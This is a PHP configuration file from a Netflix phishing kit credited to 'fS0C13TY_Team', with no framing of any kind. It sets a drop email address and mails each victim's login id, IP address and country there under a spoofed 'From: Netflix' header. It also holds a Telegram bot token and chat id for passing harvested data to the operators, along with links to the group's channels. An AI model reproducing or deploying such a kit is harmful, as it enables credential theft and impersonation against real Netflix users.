<?php
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * NETFLIX -
 * version 01
 * icq & telegram = @FUCKTOS0C13TY
 
###############################################
#$            C0d3d by fS0C13TY_Team         $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 NETFLIX           $#
###############################################

**/
$yourmail  = 'levi007008@outlook.fr';


$subject  = " ".$_SESSION['iduserLoginId']." / ".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ";
$headers .= "From: Netflix" . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);

/**Add Your Api Telegram Token Bellow : **/
$botToken="1359496319:AAFmbxq3aGh--uT4qyak_FNy0sQrvzNTMZ4";
$chatId="411801564";  

$Our_Name = "fSOCIETY🖕🤡🖕" ; 

$Name_page = "💖Netflix By fSOCIETY💖" ;

$JoinUs_On_youtube = "https://www.youtube.com/channel/UCLnz5ZLUsHccLgXVLa5vv9w";

$JoinUs_On_Facebook = "https://www.facebook.com/FsocietyZone/";

$JoinUs_On_telegram = "https://t.me/FUCKTOS0C13TY";



?>